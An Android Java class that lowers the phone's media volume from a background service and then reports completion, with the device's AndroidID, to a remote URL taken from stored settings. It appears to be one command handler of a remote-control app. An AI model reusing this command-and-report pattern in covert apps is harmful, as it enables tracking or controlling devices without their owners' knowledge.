package u.can.i.up.expert.utils;

import android.content.Context;
import android.media.AudioManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class mediaVolumeDown extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... params) {
        AudioManager audioManager = (AudioManager) DataSet.getInstance().myService.getSystemService(Context.AUDIO_SERVICE);
        audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC,AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {try {
        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Media Volume Down Complete");
    } catch (UnsupportedEncodingException e) {

        e.printStackTrace();
    }}
    @Override
    protected void onPreExecute() {}
    @Override
    protected void onProgressUpdate(Void... values) {}
}
